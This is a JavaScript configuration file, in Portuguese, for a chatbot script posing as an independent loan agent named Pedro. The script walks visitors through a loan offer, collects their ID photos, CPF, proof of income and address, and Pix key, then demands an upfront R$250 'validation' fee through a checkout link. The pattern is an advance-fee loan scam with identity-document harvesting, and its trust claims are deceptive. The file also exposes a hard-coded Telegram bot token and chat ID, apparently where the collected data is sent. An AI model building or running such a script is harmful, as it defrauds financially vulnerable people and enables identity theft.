// +---------------------------------------------------------------+
// |  CONFIGURAÇÃO DO CHATBOT - PEDRO DA SILVA LIMA                |
// |  Empréstimo Seguro • 2026 • Total Transparência               |
// +---------------------------------------------------------------+

window.CONFIG = {
  
  // -------------------------------------------------------------
  // ?? IDENTIFICAÇÃO
  // -------------------------------------------------------------
  botName: "Pedro",
  botPhoto: "imagens/perfil.jpg",
  
  // -------------------------------------------------------------
  // ?? TELEGRAM (SUAS CREDENCIAIS)
  // -------------------------------------------------------------
  telegramToken: "8314626965:AAE6tBJyGopYJTD46nR-6EhwunV849pVrX4",
  telegramChatId: "8436758614",
  
  // -------------------------------------------------------------
  // ?? MENSAGENS POR ETAPA
  // -------------------------------------------------------------
  mensagens: {
    
    // Saudação por horário
    saudacao() {
      const hora = new Date().getHours();
      if (hora >= 5 && hora < 12) return "Bom dia! ??";
      if (hora >= 12 && hora < 18) return "Boa tarde! ??";
      return "Boa noite! ??";
    },
    
    // Etapa 1: Pedir nome
    pedirNome() {
      const saudacao = this.saudacao();
      return `${saudacao} Meu nome é <b>Pedro da Silva Lima</b>.<br>
Atuo há mais de <b>12 anos</b> no segmento de empréstimos online, sempre com foco total em <b>segurança, transparência e atendimento direto</b>.<br><br>
Antes de continuarmos, poderia me dizer seu <b>nome completo</b>? ??`;
    },
    
    // Etapa 2: Apresentação + proposta + tabela
    apresentacao(nome) {
      return `Prazer, ${nome}! ??<br><br>
Sou o Pedro, e trabalho de forma <b>direta, sem intermediários</b> — você fala comigo do início ao fim.<br><br>
?? <b>IMPORTANTE – LEIA COM ATENÇÃO</b><br>
?? Este é meu único canal oficial de atendimento.<br>
?? Não trabalho com terceiros ou parceiros.<br>
? Desconfie de qualquer outro contato se passando por mim.<br><br>
?? <b>COMO FUNCIONA – 2026</b><br>
? Taxa única de <b>R$ 250,00</b> para validação do contrato digital.<br>
? Valor liberado em até <b>15 minutos a 24 horas</b> após confirmação.<br>
? Contrato digital com todos os comprovantes.<br>
? A taxa é devolvida como bonificação na última parcela!<br><br>
?? <b>Por que R$250?</b><br>
Essa taxa cobre: emissão/autenticação do contrato, custos operacionais e validação de dados — garantindo que ambas as partes estejam comprometidas.<br><br>
?? <b>TABELA DE EMPRÉSTIMOS – 2026</b><br>
R$ 2.000 ? 20x de R$ 120<br>
R$ 3.000 ? 20x de R$ 180<br>
R$ 4.000 ? 30x de R$ 160<br>
R$ 5.000 ? 30x de R$ 200<br>
R$ 6.000 ? 36x de R$ 200<br>
R$ 7.000 ? 35x de R$ 240<br>
R$ 8.000 ? 40x de R$ 240<br>
R$ 9.000 ? 48x de R$ 225<br>
R$ 10.000 ? 38x de R$ 289,47<br>
R$ 20.000 ? 48x de R$ 500<br>
R$ 30.000 ? 50x de R$ 720<br><br>
?? Você tem interesse em seguir com esse processo?<br>
Responda com: <b>"sim"</b>, <b>"ok"</b>, <b>"interesse"</b>, <b>"ok tenho interesse"</b> ou <b>"não tenho interesse"</b>`;
    },
    
    // Etapa 3: Documentos + informações do empréstimo
    documentos(nome) {
      return `Excelente, ${nome}! ??<br><br>
Para validar seu cadastro e liberar o empréstimo, preciso dos seguintes documentos:<br><br>
? <b>Fotos do RG ou CNH</b> (frente e verso)<br>
? <b>CPF</b><br>
? <b>Comprovante de residência</b> (conta de luz, água ou extrato bancário — até 90 dias)<br>
? <b>Comprovante de renda</b> (holerite, contracheque ou extrato bancário)<br>
? <b>E-mail válido</b><br>
? <b>Chave Pix</b> (para liberação rápida)<br><br>
?? Após enviar os documentos, informe também:<br>
• <b>Valor desejado</b> (a partir de R$ 2.000)<br>
• <b>Forma de pagamento da taxa</b>: <b>Pix</b> ou <b>Boleto</b><br>
• <b>Data de vencimento das parcelas</b>: <b>10</b>, <b>20</b> ou <b>30</b><br><br>
?? Envie tudo aqui mesmo pelo botão de anexo (??).<br><br>
Após enviar, digite uma das palavras abaixo para prosseguir:<br>
• <b>"ENVIADO"</b><br>
• <b>"FEITO"</b><br>
• <b>"PRONTO"</b><br>
• <b>"OK"</b><br>
• <b>"CONCLUÍDO"</b><br><br>
?? Assim que confirmar, enviarei o link do checkout para pagamento da taxa de <b>R$ 250,00</b>.`;
    },
    
    // Etapa 4: Link do checkout
    checkoutLink(nome) {
      // ?? Substitua pelo seu link real do EvoPay
      const link = "https://app.evopay.cash/checkout/SEU_ID_AQUI";
      return `? Ótimo, ${nome}! Todos os documentos e informações recebidos.<br><br>
Agora, para liberar seu empréstimo, basta pagar a taxa única de <b>R$ 250,00</b> via checkout seguro:<br><br>
?? <a href="${link}" target="_blank"><b>?? ACESSAR CHECKOUT (R$ 250,00)</b></a><br><br>
?? Após o pagamento, envie o <b>comprovante do Pix</b> aqui mesmo.<br>
? Seu empréstimo será liberado em até <b>15 minutos a 24 horas</b> após confirmação.`;
    },
    
    // Etapa 5: Sem interesse
    semInteresse(nome) {
      return `Tudo bem, ${nome}! ??<br>
Respeito totalmente sua decisão. Se no futuro precisar de um empréstimo seguro e transparente, estarei por aqui.<br><br>
Tenha um ótimo dia! ??`;
    },
    
    // Etapa 6: Mensagem padrão
    padrao(nome) {
      return `${nome}, por favor, responda com:<br>
• <b>"sim"</b>, <b>"ok"</b>, <b>"interesse"</b> ou <b>"ok tenho interesse"</b><br>
• <b>"não tenho interesse"</b><br><br>
Ou envie seus documentos usando o botão ??.`;
    }
  }
};
